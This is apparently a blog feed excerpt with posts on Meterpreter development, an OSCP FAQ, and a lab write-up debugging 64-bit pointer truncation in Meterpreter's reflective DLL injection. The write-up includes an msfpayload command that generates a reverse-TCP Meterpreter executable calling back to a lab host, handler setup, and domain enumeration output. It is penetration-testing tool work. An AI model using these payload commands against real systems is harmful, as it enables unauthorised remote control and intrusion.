</span><span class='line'>Guest           Guest           CN=Guest,CN=Users,DC=windows,DC=old               Built-in account for guest access to the computer/domain                                 
</span><span class='line'>IUSR_WIN2K      IUSR_WIN2K      CN=IUSR_WIN2K,CN=Users,DC=windows,DC=old          Built-in account for anonymous access to Internet Information Services                   Built-in account for anonymous access to Internet Information Services
</span><span class='line'>IWAM_WIN2K      IWAM_WIN2K      CN=IWAM_WIN2K,CN=Users,DC=windows,DC=old          Built-in account for Internet Information Services to start out of process applications  Built-in account for Internet Information Services to start out of process applications
</span><span class='line'>SCHMIDT$        schmidt         CN=schmidt,CN=Computers,DC=windows,DC=old         test PC                                                                                  
</span><span class='line'>TsInternetUser  TsInternetUser  CN=TsInternetUser,CN=Users,DC=windows,DC=old      This user account is used by Terminal Services.                                          
</span><span class='line'>WIN2K$          WIN2K           CN=WIN2K,OU=Domain Controllers,DC=windows,DC=old  This is a TEST.                                                                          
</span><span class='line'>alice           Alice           CN=Alice,CN=Users,DC=windows,DC=old                                                                                                        
</span><span class='line'>bob             BOB             CN=BOB,CN=Users,DC=windows,DC=old                                                                                                          
</span><span class='line'>fido            fido            CN=fido,CN=Users,DC=windows,DC=old                                                                                                         
</span><span class='line'>krbtgt          krbtgt          CN=krbtgt,CN=Users,DC=windows,DC=old              Key Distribution Center Service Account                                                  
</span><span class='line'>
</span><span class='line'>Total users: 11</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>adsi_computer_enum output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; adsi_computer_enum 
</span><span class='line'>
</span><span class='line'>Usage: adsi_computer_enum &lt;domain&gt; [-h] [-m maxresults] [-p pagesize]
</span><span class='line'>
</span><span class='line'>Enumerate the computers on the target domain.
</span><span class='line'>
</span><span class='line'>Enumeration returns information such as the computer name, desc, and comment.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -m &lt;opt&gt;  Maximum results to return.
</span><span class='line'>    -p &lt;opt&gt;  Result set page size.
</span><span class='line'>
</span><span class='line'>windows.old Computers
</span><span class='line'>=====================
</span><span class='line'>
</span><span class='line'>name     distinguishedname                                 description      comment
</span><span class='line'>----     -----------------                                 -----------      -------
</span><span class='line'>WIN2K    CN=WIN2K,OU=Domain Controllers,DC=windows,DC=old  This is a TEST.  
</span><span class='line'>schmidt  CN=schmidt,CN=Computers,DC=windows,DC=old         test PC          
</span><span class='line'>
</span><span class='line'>Total computers: 2</span></code></pre></td></tr></table></div></figure>


<p>If you like this idea, then watch carefully because this should be landing in a Metasploit installation near you very soon.</p>

<h2>Doxygen documentation</h2>

<p>Documentation. It&rsquo;s the downfall of almost every software project. Open Source tends to suffer more so. Meterpreter&rsquo;s history has been slightly tarnished thanks to the lack of documentation, but that is something that we&rsquo;re working to fix. The issue of documentation can be solved in many ways, and the way that we&rsquo;ve decided to start solving the problem with Meterpreter is by using <a href="http://www.doxygen.org/">Doxygen</a> and slowly, but surely, work our way through the source and add whatever documentation we can.</p>

<p>Needless to say this is a big job. The team is aiming to write more documentation with each commit so that we can cover the source base during the course of doing normal work.</p>

<p>The generated Doxygen documentation can be found on the <a href="https://ci.metasploit.com/job/MeterpreterWinDocs/lastSuccessfulBuild/artifact/docs/html/index.html">Metasploit CI server</a>. This gets updated each time a new build is created, so it should always reflect what is currently in the <code>master</code> Meterpreter branch.</p>

<p>People who are interested in getting involved in Meterpreter should look to start by pulling the source, reading bits of code and adding documentation. It might not be glamorous, but it&rsquo;s very much appreciated and is a great way to get familiar with the source before diving into code contributions.</p>

<h2>What&rsquo;s Next?</h2>

<p>I&rsquo;m happy to say that Rapid7 are keeping me on for a while longer! There&rsquo;s always more to do with Meterpreter and never enough time to do it. While I can&rsquo;t say for sure what will be done next, I can generalise by saying that it&rsquo;ll most likely include:</p>

<ul>
<li>Fixing compatibility issues with newer versions of Windows, particularly with regards to things like packet capture, pivoting, etc.</li>
<li>Resolving the issue with non-tcp payload binaries failing to shutdown.</li>
<li>Removing the last of the issues that result in crashes or general instability.</li>
<li>Updating <code>mimikatz</code> to v2.0 (already in progress!).</li>
<li>Trying to improve Meterpreter&rsquo;s stealth and protect it from being investigated.</li>
<li>Finalising the streaming work so that <code>clipboard_monitor</code> can become a reality.</li>
<li>Adding improvements and features to things like the ADSI support and <code>extapi</code> (coming very soon).</li>
<li>Working through the general backlog of bugs.</li>
<li>Working on some things that I won&rsquo;t talk about publicly.</li>
<li>Hopefully keeping the Rapid7 folks happy so that I can continue to work with them.</li>
</ul>


<p>If you have suggestions, let&rsquo;s hear them! Even better, submit a PR, and to encourage you:</p>

<blockquote><p>I will personally send a quality, quintessentially Australian fluffy crocodile toy via snail-mail to the first non-Rapid7 person who submits a pull request with a non-trivial fix or contribution to Meterpreter and have it merged into master.</p></blockquote>

<p>That&rsquo;s right, you could be a winner of some Oz awesome! So get coding, it&rsquo;s not that hard&hellip; any more!</p>

<h2>What? Is that it?</h2>

<p>I know it doesn&rsquo;t appear like much for just 3 short months, but yes that&rsquo;s basically it. There are lots of other small fixes, tweaks, adjustments, etc. along the way but nothing that really kept me tied up for extended periods like the stuff that&rsquo;s listed in here. I&rsquo;m aiming to lift the throughput, but as time goes by it gets <em>harder</em> to add big chunks of value. However, the job of someone like me is to make myself obsolete, as that would imply there&rsquo;s nothing more I can do to make it better. In other words, I&rsquo;ll have made it as good as I am capable of making it.</p>

<h2>Gratitude</h2>

<p>I&rsquo;ve had an absolute blast working on Meterpreter these last few months, and I want to publicly acknowledge some folks who have been super supportive since I started. The first is <a href="https://twitter.com/todb">Tod</a> for giving me the chance to work with Rapid7 in the first place, and for being awesome to work for/with since kicking off. I&rsquo;ve thoroughly enjoyed being part of his team. I&rsquo;m also <em>very</em> grateful that he&rsquo;s happy for me to stay on a bit longer to do more!</p>

<p>Second is <a href="https://twitter.com/egyp7">Egypt</a>. Not only is this bloke super smart and super nice, but he seems to have unending patience when it comes to me and my stupid questions. It&rsquo;s humbling to be in the presence of this guy, and it was a career highlight to meet him this year at <a href="https://ruxconbreakpoint.com/">BPX</a>/<a href="http://ruxcon.org.au/">Rux</a> and get to share some stories over a scotch or three.</p>

<p>Next, a collective holler to the other legendary Rapid7 folk who put up with me every day and who are a constant source of inspiration and learnings: <a href="https://twitter.com/TheLightCosine">TheLightCosine</a>, <a href="https://twitter.com/_juan_vazquez_">Juan</a>, <a href="https://twitter.com/_sinn3r">sinn3r</a>, <a href="https://twitter.com/wvuuuuuuuuuuuuu">wvu</a> and <a href="https://twitter.com/hdmoore">HD Moore</a>. Just being present when these people have a conversation is enough to make me realise how much more I need to learn and vast their abilities are. Thanks to you all for your time and support. I am easily the dumbest guy in the room which means I&rsquo;m in the right room!</p>

<p>To the general security community folk who, despite not being involved with Rapid7, have given me time and support beyond that which I deserve while working on Meterpreter and trying to make the jump into the security field: <a href="https://twitter.com/pipes">Pipes</a>, <a href="https://twitter.com/mubix">Mubix</a>, <a href="https://twitter.com/kernelsmith">Kernelsmith</a>, <a href="https://twitter.com/Meatballs__">Meatballs</a> (thanks for landing those PRs!), <a href="https://twitter.com/zeknox">Zeknox</a>, <a href="https://twitter.com/Mateusz_Jozef">Matthew Risck</a>, <a href="https://twitter.com/smilingraccoon">SmilingRaccoon</a>, <a href="https://twitter.com/justinsteven">Justin</a>, <a href="https://twitter.com/radac_">radac</a>, <a href="https://twitter.com/sw1tch1ng">sw1tch</a>, <a href="https://twitter.com/sebbity">Novex</a>, <a href="https://twitter.com/ashd_au">Ash</a> and <a href="https://twitter.com/wadealcorn">Wade</a> &hellip; and many others. You&rsquo;re all bloody legends.</p>

<p>I hope I get to continue working on this amazing piece of kit with all these amazing people. I haven&rsquo;t had this much fun in <em>years</em>.</p>

<p>Thanks to you all for reading. I hope you enjoyed it and I hope it broke down some of the barriers between you and Meterpreter contributions. If there are any questions, hit me up via <a href="http://buffered.io/contact">email</a>, <a href="https://twitter.com/TheColonial">Twitter</a> or leave a comment here. If you want to get started with Meterpreter contributions I&rsquo;d certainly love to hear from you.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OSCP FAQ]]></title>
    <link href="http://buffered.io/posts/oscp-faq/"/>
    <updated>2013-12-12T19:01:00+10:00</updated>
    <id>http://buffered.io/posts/oscp-faq</id>
    <content type="html"><![CDATA[<p>Since publishing the article that detailed my experiences with the <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/">PWB</a> labs and the <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a> exam, I have received scores of emails from potential and current students searching for more information and (quite often) hints. While I do my best to answer most of them, it&rsquo;s close to impossible to get to them all as my email debt is already way too high.</p>

<p>From this point on I have decided not to respond to questions directly via email. This post will stand instead of those emails as a point of reference for common OSCP-related questions. As more questions come in I will update this post so that all future readers can benfit from the answers without me having to repost them.</p>

<!--more-->


<blockquote><p>Do I need to be good at programming to do PWB?</p></blockquote>

<p>I&rsquo;d say <em>no</em>, but it really does help. If you&rsquo;re not good with at least one language, then you&rsquo;re going to have a harder time and you&rsquo;ll probably end up needing to purchase time extensions to get through the labs. Scripting and coding is an important part of the experience, and it&rsquo;s something you really should be able to do. You could probably get through the labs without it, but it will be difficult. My recommendation is to go and spend time learning a language like <a href="http://www.python.org/">Python</a>, <a href="http://www.ruby-lang.org/">Ruby</a> or even <a href="http://en.wikipedia.org/wiki/Bash_(Unix_shell)">Bash</a> so that you have the ability to automate some of the tasks you&rsquo;ll have to take on.</p>

<blockquote><p>Should I do OSCP first, or should I take on other certs (such as <a href="https://www.eccouncil.org/Certification/certified-ethical-hacker">CEH</a>, <a href="http://www.giac.org/certification/penetration-tester-gpen">GPEN</a> or <a href="http://mile2.com/penetration-testing-ethical-hacking/cpte.html">CPTE</a>) as preparation?</p></blockquote>

<p>I haven&rsquo;t done CEH, GPEN or CPTE. In fact, to date, OSCP is the only security certification I have attempted to tackle (though I will be taking <a href="http://www.offensive-security.com/information-security-training/cracking-the-perimeter/">CTP</a> later this month with a goal of nailing <a href="http://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/">OSCE</a> in January). As a result I don&rsquo;t have a valid opinion of the quality or usefulness of the other certifications. My feeling is that it&rsquo;s down to you, dear reader, to determine which is best for you, just as I did when I was looking for a challenge. If you feel that OSCP is out of your depth then by all means go and find something easier.</p>

<blockquote><p>Is there much web application hacking involved?</p></blockquote>

<p>It&rsquo;s hard to quantify &ldquo;much&rdquo;, but yes there is a bit of hacking of web applications involved. Some are known applications, some are custom applications built specifically for the labs. If you&rsquo;re not across the basics before you start, be prepared to ramp up quickly once your lab time commences.</p>

<blockquote><p>Do I need to know about assembly language?</p></blockquote>

<p>There are parts of the course which require you to have a basic understanding of assembly, though only x86 and not x64. I think it&rsquo;s a good idea to get your hands dirty prior to taking the course, because you will be using and adjusting exploits during your lab time.</p>

<blockquote><p>How many hours per day did you spend in the labs? Is an hour per day enough?</p></blockquote>

<p>The short answer is that I spent as many as I possibly could. I paid for just 30 days in the lab which meant that I had to force myself to push hard to get through as many machines as possible without having to pay for more time. It was a cost saver and a personal quest at the same time. On average, my guess is that I spent four or so hours per day, and more on weekends. One hour per day would not be enough, in my opinion, even if you booked 90 days worth of lab time.</p>

<p>My recommendation is to do your best to have larger, unbroken blocks of time rather than lots of smaller chunks of time. This gives you the chance to immerse yourself in a problem and maximises the possibility of you solving it without the context-switching which can be really distruptive to your thought process.</p>

<p>PWB is hard, don&rsquo;t expect to get through it in an hour per day unless you&rsquo;re a guru with lots of experience.</p>

<blockquote><p>Can you please give me a hint for <strong>&lt;machine name&gt;</strong> in the PWB labs, because I&rsquo;m stuck?</p></blockquote>

<p>No. PWB and OSCP is all about learning to learn. The journey is probably more important than the final destination. I will not give hints, and if you ask for them you&rsquo;ll more than likely receive no response from me. If I do respond, I will probably just say &ldquo;Try Harder&rdquo;.</p>

<blockquote><p>Can I please see your lab notes?</p></blockquote>

<p>Absolutely not.</p>

<blockquote><p>I have been a developer for many years and want to try for OSCP, is it a waste of time?</p></blockquote>

<p>No, it&rsquo;s not a waste of time, and yes you shoud try for it. This is exactly the scenario I was in, and I don&rsquo;t regret doing it for a one second. Also, I do believe that anyone who is involved with building production systems should do this course as it really does open your eyes. Most developers haven&rsquo;t really got much visibility of what things are like on the front line when it comes to security. This course is the kind of thing that will make them think much more defensively when writing their code.</p>

<blockquote><p>Will OSCP provide me with the skills I need to be a penetration tester?</p></blockquote>

<p>OSCP by itself will not. I think the only thing that can really give you the skills is experience. However, OSCP is a great start and it gives a great foundation on which to build a career as a penetration tester.</p>

<p>In other words, don&rsquo;t stop learning!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[64bit Pointer Truncation in Meterpreter]]></title>
    <link href="http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter/"/>
    <updated>2013-09-14T07:25:00+10:00</updated>
    <id>http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter</id>
    <content type="html"><![CDATA[<p>If you haven&rsquo;t ever heard of <a href="https://github.com/rapid7/meterpreter" title="Native Meterpreter">Meterpreter</a> before, you might want to go and take a look at it before reading this post to help give some context. In short, Meterpreter is an amazing library that is part of the <a href="http://www.metasploit.com/" title="Metasploit Framework">Metasploit Framework</a> and can be used to give you tremendous power and control over target machines during a <a href="http://en.wikipedia.org/wiki/Penetration_test" title="Penetration Testing">penetration test</a>. Anyone and everyone in the security game is most likely familiar with both Metasploit and Meterpreter, at the very least, if not closely intimate with them. The toolset is fantastic, and is <a href="https://github.com/rapid7/metasploit-framework/" title="Metasploit Framework Source">open source</a>!</p>

<p>I&rsquo;m currently in the very fortunate position of <a href="https://community.rapid7.com/community/metasploit/blog/2013/09/05/weekly-update" title="Weekly Update: Meterpreter Updates, VMWare, the OSX spycam, Retabbing, and more!">working with the crew</a> from <a href="http://www.rapid7.com/" title="Rapid 7">Rapid7</a> to help improve Meterpreter, particularly on the Windows (both 32 and 64 bit). I have a good list of things to work through while I&rsquo;m on board including making it easier to build for potential contributors, and to fix some outstanding issues that the R7 crew haven&rsquo;t had the bandwidth to fix.  These people are super-smart, and super-nice and I&rsquo;m honoured that I&rsquo;ve been selected to work alongside them.</p>

<p>The purpose of this post is to document the process and resolution of a bug that I have helped resolve since joining. I also aim to lift the lid on Meterpreter a little and help expose how some bits of it work. I hope you enjoy.</p>

<!--more-->


<h2>Meterpreter Basics</h2>

<p>When exploiting a vulnerability during a penetration test using Metasploit, you have a number of payloads that you choose to use which give you some sort of control over your target. Of those payloads, Metepreter is not only the most common, but is probably the most powerful.</p>

<p>Once you have an instance of Metepreter running on a target, you&rsquo;ve got quite a lot of control. You can escalate privileges, dump password hashes, launch processes, upload files, and you can even use it as a pivot-point for launching attacks against other non-routable hosts. While the power of all this is enough to bake anyone&rsquo;s noodle, the thing that blows my mind the most is Meterpreter&rsquo;s ability to migrate to other processes. That is, Meterpreter can dynamically load itself into another processes and then reconnect to your Metasploit session seamlessly without any effort from the attacker (ie. you). Simply executing <code>migrate &lt;process id&gt;</code> at the Meterpreter prompt is all it takes.</p>

<p>There are some caveats when it comes to migration. In particular, you need to have permission to write to the target process&rsquo;s memory otherwise the migration will not succeed.</p>

<p>Meterpreter comes in quite a few flavours, including <code>PHP</code>, <code>Python</code>, and <code>native/C</code> for Linux and Windows. Some implementations are more feature-rich than others, but they all have common functionality which makes it easy to perform a variety of functions on a compromised host.</p>

<p>We&rsquo;ll be focusing on the Windows native payload in this post, and in particular we&rsquo;ll be looking at how Meterpreter is loaded and executed.</p>

<h2>Reflective DLL Injection</h2>

<p>Simply put, Reflective DLL Injection is a method for injection a DLL into a process. No surprises there. However, it has some nifty properties that make a great candidate for use in tools such as Meterpreter. Some of those points include:</p>

<ul>
<li>Position-independence.</li>
<li>Lack of host system registration.</li>
<li>Largely undetectable on the target at both a system and process level.</li>
</ul>


<p>The canonical paper [<a href="http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf" title="Reflective DLL Injection">PDF</a>], written by <a href="http://twitter.com/stephenfewer">Stephen Fewer</a>, is well worth reading and can be found on the <a href="http://harmonysecurity.com/" title="Harmony Security">Harmony Security</a> website. Read it. It&rsquo;s amazing, and does a much better job of explaining itself than I could ever hope to. I would like to point out that there&rsquo;s a multi-stage process involved which includes:</p>

<ul>
<li>Writing the code to an executable area of memory.</li>
<li>Executing the loader which creates a valid DLL image in memory.</li>
<li>Calling <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583(v=vs.85).aspx" title="DllMain Entry Point">DllMain</a> on the loaded DLL.</li>
<li>Returning control to the process that invoked it.</li>
</ul>


<p>With that in mind, let&rsquo;s take a look at the bug.</p>

<h2>The Bug</h2>

<p>The bug that was reported related to process migration, and went something like this (paraphrased slightly with a bit more information):</p>

<blockquote><p>Trying to migrate Metepreter between processes on Windows 2012 seems to be
unreliable. It will migrate just fine into some processes, such as <em>explorer.exe</em>,
without any problems. However, spawning another process, such as <em>notepad.exe</em>, and
migrating to it hangs the entire session. Migrating to the <em>winlogon.exe</em> process
crashes the entire user environment on the target host.</p></blockquote>

<p>When I first read this report I thought &ldquo;Wow, how am I going to track this down?&rdquo;, and I&rsquo;ll admit that I was a little intimidated at first, especially given that I knew that the native Windows Meterpreter was using Reflective DLL Injection to load itself into other processes. However, it&rsquo;s been a long time since I&rsquo;d been tasked with something this challenging and so, deep down, I was looking forward to diving in.</p>

<h2>Replication</h2>

<p>The first step was to fire up a Windows 2012 virtual machine and replicate the problem. Windows 2012 only comes in a 64-bit flavour, so picking the right version wasn&rsquo;t a problem.</p>

<p>After installation, I needed to simulate an attack coming from Metasploit so that I could interact with Meterpreter to perform the migration.</p>

<p>Creating a payload to do this is really simple thanks to <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload" title="msfpayload">msfpayload</a> (part of Metasploit). On my <a href="http://www.backtrack-linux.org/" title="Backtrack Linux">Backtrack</a> VM I used the following command to generate the PE image:</p>

<pre><code>root@bt:~# msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.5.26.40 LPORT=443 X &gt; 40-443-x64.exe
</code></pre>

<p>This command creates a 64-bit Windows executable that contains a small stager. This stager connects to <code>10.5.26.40</code> (my Backtrack VM) on port <code>443</code> (I always choose the HTTPS port to avoid potential outbound firewall issues). Once connected it will download the Meterpreter payload and establish a session with Metasploit.</p>

<p>I copied this binary to the Windows 2012 machine ready to execute. At this point, Metasploit needs to be set up and configured to deal with the incoming request. On the Backtrack VM, we run <code>msfconsole</code> and set it up to use <code>multi/handler</code> with the appropriate settings, like so:</p>

<pre><code>msf exploit(handler) &gt; show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LHOST     10.5.26.40       yes       The listen address
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
</code></pre>

<p>With those settings in place, the exploit was ready to fire:</p>

<pre><code>msf exploit(handler) &gt; exploit

[*] Started reverse handler on 10.5.26.40:443 
[*] Starting the payload handler...
</code></pre>

<p>From the Windows 2012 VM I ran the exploit binary and my Metepreter session kicked off:</p>

<pre><code>[*] Sending stage (951296 bytes) to 10.5.26.30
[*] Meterpreter session 1 opened (10.5.26.40:443 -&gt; 10.5.26.30:38516) at 2013-09-11 21:55:52 +1000

meterpreter &gt; getuid
Server username: WIN-URCAUVPE291\OJ Reeves
meterpreter &gt; sysinfo
Computer        : WIN-URCAUVPE291
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/win64
meterpreter &gt; 
</code></pre>

<p>Before trying the failure case, I wanted to make sure that the known success case worked locally first. I decided to migrate to <code>explorer.exe</code> and see if anything changed:</p>

<pre><code>meterpreter &gt; ps

Process List
============

 PID   PPID  Name                Arch    Session     User                       Path
 ---   ----  ----                ----    -------     ----                       ----
 0     0     [System Process]            4294967295                             
 4     0     System                      4294967295                             
 444   4     smss.exe                    4294967295                             
 484   708   svchost.exe                 4294967295                             
 536   524   csrss.exe                   4294967295                             
 604   596   csrss.exe                   4294967295                             
 612   524   wininit.exe                 4294967295                             
 640   596   winlogon.exe                4294967295                             
 692   720   explorer.exe        x86_64  1           WIN-URCAUVPE291\OJ Reeves  C:\Windows\Explorer.EXE
 708   612   services.exe                4294967295                             
 716   612   lsass.exe                   4294967295                             
 804   708   svchost.exe                 4294967295                             
 816   708   svchost.exe                 4294967295                             

... snip ...

meterpreter &gt; migrate 692
[*] Migrating from 1508 to 692...
[*] Migration completed successfully.
meterpreter &gt; getuid
Server username: WIN-URCAUVPE291\OJ Reeves
meterpreter &gt; sysinfo
Computer        : WIN-URCAUVPE291
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/win64
meterpreter &gt; 
</code></pre>

<p>Migration seemed to work. Next I tried the failure case. First I launched <code>notepad.exe</code> and then attempted to migrate to it:</p>

<pre><code>meterpreter &gt; execute -f notepad.exe -t -H
Process 192 created.
meterpreter &gt; migrate 192
[*] Migrating from 692 to 192...
[-] Error running command migrate: Rex::RuntimeError No response was received to the core_loadlib request.
meterpreter &gt;
</code></pre>

<p>The session hung at this point and no Meterpreter commands would work. When I went over to the Windows 2012 VM I saw that there was a notification that the notepad.exe process had crashed. This was great as I was able to reproduce the failure. It was time to investigate the problem.</p>

<h2>Diagnosis</h2>

<p>To help figure out what was going wrong, I enlisted the help of two of my favourite tools: <a href="http://technet.microsoft.com/en-au/sysinternals/bb896647.aspx" title="DebugView">DebugView</a> and <a href="http://en.wikipedia.org/wiki/WinDbg" title="Windbg">Windbg</a>. Coverage of these tools is beyond the scope of the article, so if you want to learn more about them you&rsquo;ll find a stack of information out on the web. Given that this machine was 64-bit and the process we were aiming to debug was 64-bit, I installed the 64-bit version of the <a href="http://msdn.microsoft.com/en-us/windows/hardware/gg463009.aspx" title="Debugging Tools for Windows">Debugging Tools for Windows</a> so that the right version of <code>windbg</code> was available.</p>

<p>Before dabbling with any of the binaries and adding debug detail, I repeated the failure scenario but with one small change: I launched <code>notepad.exe</code> manually and attached to it from <code>windbg</code> prior to performing the migration. I left <code>DebugView</code> running as well to catch any debug messages from processes outside of the one that <code>windbg</code> was attached to.</p>

<p>Upon running the <code>migrate</code> command <code>notepad.exe</code> crashed and <code>windbg</code> caught the exception. This is what it showed:</p>

<pre><code>(ab0.448): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
00000000`707a7b5c ??              ???
</code></pre>

<p>We can see that we&rsquo;re accessing memory that we shouldn&rsquo;t be accessing. But why?</p>

<pre><code>0:003&gt; !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************


FAULTING_IP: 
unknown!printable+0
00000000`707a7b5c ??              ???

EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 00000000707a7b5c
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000008
   Parameter[1]: 00000000707a7b5c
Attempt to execute non-executable address 00000000707a7b5c

... snip ...
</code></pre>

<p>The migration process results in an attempt to execute a section of code in an area of memory that isn&rsquo;t marked as executable. Let&rsquo;s confirm that:</p>

<pre><code>0:003&gt; !vprot 00000000707a7b5c
BaseAddress:       00000000707a7000
AllocationBase:    0000000000000000
RegionSize:        000000000f839000
State:             00010000  MEM_FREE
Protect:           00000001  PAGE_NOACCESS
</code></pre>

<p>As we can see the memory area is definitely not marked as executable. But should it be? Should this memory be executable, or are we just pointing to an invalid area of memory? If it was the former, then it might imply that DEP or ASLR are somehow interfering. However, my gut feeling was that it was the latter. A quick look at the contents of the memory at this location would be enough to confirm:</p>

<pre><code>0:003&gt; du 00000000707a7b5c
00000000`707a7b5c  "????????????????????????????????"
00000000`707a7b9c  "????????????????????????????????"
00000000`707a7bdc  "????????????????????????????????"
00000000`707a7c1c  "????????????????????????????????"
00000000`707a7c5c  "????????????????????????????????"
00000000`707a7c9c  "????????????????????????????????"
00000000`707a7cdc  "????????????????????????????????"
00000000`707a7d1c  "????????????????????????????????"
00000000`707a7d5c  "????????????????????????????????"
00000000`707a7d9c  "????????????????????????????????"
00000000`707a7ddc  "????????????????????????????????"
00000000`707a7e1c  "????????????????????????????????"
</code></pre>

<p>It&rsquo;s pretty clear that no valid code is located in this area of memory. This implied that there was a possibility that a pointer to an area of code is somehow going awry. But where? To find this out, I needed to add some more debug output to Meterpreter.</p>

<p>Next, I opened the Meterpreter source in Visual Studio 2012 (freshly moved from VS 2010 by yours truly) and prepared to rebuild the binaries with some extra debug output. I littered the code with <a href="http://msdn.microsoft.com/en-us/library/windows/apps/aa363362(v=vs.85).aspx" title="OutputDebugString function">OutputDebugString</a> calls at various key locations, enabled the existing logging that was built into the source, and rebuilt the suite of binaries from scratch. Once built, I deployed them to my Backtrack VM, fired up <code>DebugView</code> on the Windows 2012 VM and repeated the process (including attaching to <code>notepad.exe</code> with <code>windbg</code>). Here&rsquo;s a snippet of the output:</p>

<pre><code>[SERVER] Initializing...
[SERVER] module loaded at 0x350B0000
[SERVER] main server thread: handle=0x00000138 id=0x000008F0 sigterm=0x334D7B20
[SERVER] Using SSL transport...
[SERVER] Initializing tokens...
[SERVER] Flushing the socket handle...
[SERVER] Initializing SSL...
[SERVER] Negotiating SSL...
ModLoad: 000007ff`58060000 000007ff`58075000   C:\Windows\system32\NETAPI32.DLL
ModLoad: 000007ff`586d0000 000007ff`586de000   C:\Windows\system32\netutils.dll
ModLoad: 000007ff`5b020000 000007ff`5b044000   C:\Windows\system32\srvcli.dll
ModLoad: 000007ff`58020000 000007ff`58035000   C:\Windows\system32\wkscli.dll
ModLoad: 000007ff`5ad10000 000007ff`5ad2a000   C:\Windows\system32\CRYPTSP.dll
ModLoad: 000007ff`5a990000 000007ff`5a9d9000   C:\Windows\system32\rsaenh.dll
[SERVER] Sending a HTTP GET request to the remote side...
[SERVER] Completed writing the HTTP GET request: 27
[SERVER] Registering dispatch routines...
Registering a new command (core_loadlib)...
Allocated memory...
Setting new command...
Fixing next/prev...
Done...
[SERVER] Entering the main server dispatch loop for transport 0...
[DISPATCH] entering server_dispatch( 0x334D7B60 )
[SCHEDULER] entering scheduler_initialize.
[SCHEDULER] leaving scheduler_initialize.
[DISPATCH] created command_process_thread 0x33523030, handle=0x000001F0
[COMMAND] Processing method core_loadlib
[COMMAND] core_loadlib: Entry
[COMMAND] core_loadlib: libraryPath (ext264209.x64.dll) flags (2)
[COMMAND] core_loadlib: lib does not exist locally (being uploaded)
[COMMAND] core_loadlib: lib is not to be stored on disk
[LOADLIBRARYR] starting
[LOADLIBRARYR] GetReflectiveLoaderOffset
[LOADLIBRARYR] GetReflectiveLoaderOffset (5488)
[LOADLIBRARYR] Calling VirtualProtect lpBuffer (0000008935318B20) length (428544)
[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
ModLoad: 000007ff`555e0000 000007ff`55600000   C:\Windows\system32\WINMM.dll
ModLoad: 000007ff`555a0000 000007ff`555d2000   C:\Windows\system32\WINMMBASE.dll
ModLoad: 000007ff`57e00000 000007ff`57e2c000   C:\Windows\system32\IPHLPAPI.DLL
ModLoad: 000007ff`57de0000 000007ff`57dea000   C:\Windows\system32\WINNSI.DLL
[LOADLIBRARYR] Calling pDllMain (0000000033449BEC)
(9b8.968): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
00000000`33449bec ??              ???
</code></pre>

<p>The extra debug calls that I added to the source are those marked with <code>[LOADLIBRARYR]</code>. These calls were located in the guts of the reflective DLL injection code.</p>

<p>As we already know from earlier in this post, the reflective DLL injection code dynamically builds a valid DLL image in memory and then invokes it. The method which builds this DLL image is called <code>ReflectiveLoader()</code> and is invoked in code via a pointer called <code>pReflectiveLoader</code>, which you can see in the above output. At the end of the <code>ReflectiveLoader()</code> function, a reference to <code>DllMain()</code> is resolved and invoked directly prior to returning control to the caller.</p>

<p>Once this function returns, the Meterpreter-specific code then calls <code>DllMain()</code> again, using the value returned from <code>ReflectiveLoader()</code>, to invoke some functionality required by the Metasploit framework. In the above output, you can see the pointer to <code>DllMain()</code> called <code>pDllMain</code>, and this is the pointer that&rsquo;s used to make the call.</p>

<p>What was interesting about the log is that the first call to <code>DllMain()</code> that is invoked in the body of <code>ReflectiveLoader()</code> worked fine, otherwise the process would have crashed prior to the line that outputs the value of the <code>pDllMain</code> variable. Instead, it was the <em>second</em> call to <code>DllMain()</code> via the <code>pDllMain</code> pointer that caused the crash. This implied that the memory address that was being returned from <code>ReflectiveLoader()</code> was incorrect.</p>

